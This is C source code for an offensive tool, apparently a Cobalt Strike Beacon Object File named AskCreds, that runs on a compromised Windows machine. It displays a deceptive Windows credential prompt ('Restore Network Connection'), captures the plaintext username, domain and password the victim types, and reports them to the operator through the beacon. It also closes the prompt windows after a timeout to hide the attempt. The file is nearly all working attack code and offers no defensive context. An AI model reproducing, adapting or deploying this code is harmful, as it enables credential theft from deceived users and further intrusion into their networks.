#define SECURITY_WIN32 

#include <windows.h>
#include <wincred.h>
#include <security.h>

#include "Askcreds.h"
#include "beacon.h"

#define TIMEOUT 60
#define MAX_NAME 8192
#define REASON L"Restore Network Connection"
#define MESSAGE L"Please verify your Windows user credentials to proceed."


BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
	PCHAR pWindowTitle = NULL;
	LPWSTR pExeName = NULL;
	DWORD dwProcId = 0; 

	if (!hWnd) {
		return TRUE;
	}

	if (!USER32$IsWindowVisible(hWnd)) {
		return TRUE;
	}

#if defined(WOW64)
	LONG_PTR lStyle = USER32$GetWindowLongA(hWnd, GWL_STYLE);
#else
	LONG_PTR lStyle = USER32$GetWindowLongPtrA(hWnd, GWL_STYLE);
#endif
	if (!USER32$GetWindowThreadProcessId(hWnd, &dwProcId)){
		return TRUE;
	}

	pWindowTitle = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_NAME);
	if (pWindowTitle == NULL) {
		goto CleanUp;
	}

	if (!USER32$SendMessageA(hWnd, WM_GETTEXT, MAX_NAME, (LPARAM)pWindowTitle)) {
		goto CleanUp;
	}

	if (MSVCRT$_stricmp(pWindowTitle, "Windows Security") == 0) {
		USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
	}
	else if ((dwProcId == KERNEL32$GetCurrentProcessId()) && (WS_POPUPWINDOW == (lStyle & WS_POPUPWINDOW))){
		USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
	}
	else{
		DWORD dwSize = MAX_PATH;
		HANDLE hProcess = NULL;

		hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcId);
		if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE){
			pExeName = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
			if (pExeName == NULL) {
				goto CleanUp;
			}

			if (KERNEL32$QueryFullProcessImageNameW(hProcess, 0, pExeName, &dwSize)) {
				if (SHLWAPI$StrStrIW(pExeName, L"CredentialUIBroker.exe")) {
					USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
				}
			}
		}

		if (hProcess != NULL){
			KERNEL32$CloseHandle(hProcess);
		}
	}

CleanUp:

	if (pWindowTitle != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pWindowTitle);
	}

	if (pExeName != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pExeName);
	}

	return TRUE;
}

DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
	DWORD dwRet = 0;
	HWND hWnd;
	CREDUI_INFOW credUiInfo;
	credUiInfo.pszCaptionText = lpwReason;
	credUiInfo.pszMessageText = (LPCWSTR)MESSAGE;
	credUiInfo.cbSize = sizeof(credUiInfo);
	credUiInfo.hbmBanner = NULL;
	credUiInfo.hwndParent = NULL;

	DWORD authPackage = 0;
	WCHAR szUsername[MAXLEN];
	LPWSTR lpwPasswd = L"";
	LPVOID inCredBuffer = NULL;
	LPVOID outCredBuffer = NULL;
	ULONG inCredSize = 0;
	ULONG outCredSize = 0;
	BOOL bSave = FALSE;

	ULONG nSize = sizeof(szUsername) / sizeof(WCHAR);
	if (SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
		if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, (LPWSTR)szUsername, lpwPasswd, 0, &inCredSize) && KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
			inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
			if (inCredBuffer != NULL) {
				if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, (LPWSTR)szUsername, lpwPasswd, inCredBuffer, &inCredSize)) {
					KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
					inCredBuffer = NULL;
					inCredSize = 0;
				}
			}
		}
	}

	hWnd = USER32$GetForegroundWindow();
	if (hWnd != NULL) {
		credUiInfo.hwndParent = hWnd;
	}

	dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
		&credUiInfo, 0, 
		&authPackage, 
		inCredBuffer, 
		inCredSize, 
		&outCredBuffer, 
		&outCredSize, 
		&bSave, 
		CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
		);
	
	if (dwRet == ERROR_SUCCESS) { 
		WCHAR szUsername[MAXLEN + 1];
		WCHAR szPasswd[MAXLEN + 1];
		WCHAR szDomain[MAXLEN + 1];
		DWORD maxLenName = MAXLEN + 1;
		DWORD maxLenPassword = MAXLEN + 1;
		DWORD maxLenDomain = MAXLEN + 1;

		if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, szPasswd, &maxLenPassword)) {
			if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
				BeaconPrintf(CALLBACK_OUTPUT, 
					"[+] Username: %ls\n"
					"[+] Password: %ls\n", szUsername, szPasswd);

			}
			else {
				BeaconPrintf(CALLBACK_OUTPUT, 
					"[+] Username: %ls\n"
					"[+] Domainname: %ls\n"
					"[+] Password: %ls\n", szUsername, szDomain, szPasswd);
			}
		}

		MSVCRT$memset(szUsername, 0, sizeof(szUsername));
		MSVCRT$memset(szPasswd, 0, sizeof(szPasswd));
		MSVCRT$memset(szDomain, 0, sizeof(szDomain));
	}
	else if (dwRet == ERROR_CANCELLED) {
		BeaconPrintf(CALLBACK_ERROR, "The operation was canceled by the user, try again ;)\n");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "CredUIPromptForWindowsCredentialsW failed, error: %d\n", dwRet);
	}

	if (inCredBuffer != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
	}

	return dwRet;
}


VOID go(IN PCHAR Args, IN ULONG Length) {
	HANDLE hThread = NULL;
	DWORD ThreadId = 0;
	DWORD dwTimeOut = TIMEOUT * 1000;
	DWORD dwResult = 0;
	LPWSTR lpwReason = NULL;

	// Parse Arguments
	datap parser;
	BeaconDataParse(&parser, Args, Length);	
	lpwReason = (WCHAR*)BeaconDataExtract(&parser, NULL);
	if (lpwReason == NULL) {
		lpwReason = REASON;
	}

	hThread =  KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)lpwReason, 0, &ThreadId);
	if (hThread == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to create AskCreds thread.\n");
		return;
	}

	dwResult = KERNEL32$WaitForSingleObject(hThread, dwTimeOut);
	if (dwResult == WAIT_TIMEOUT) {  
		BeaconPrintf(CALLBACK_ERROR, "ThreadId: %d timed out, closing Window.\n", ThreadId);
		if (!USER32$EnumWindows(EnumWindowsProc, (LPARAM)NULL)) { // Cancel operation by closing Window.
			KERNEL32$TerminateThread(hThread, 0); // Only if WM_CLOSE failed, very dirty..
			return;
		}
		KERNEL32$WaitForSingleObject(hThread, 2000); // Wait a sec for thread to cleanup...
	}

	if (hThread != NULL) {
		KERNEL32$CloseHandle(hThread);
	}

	return;
}
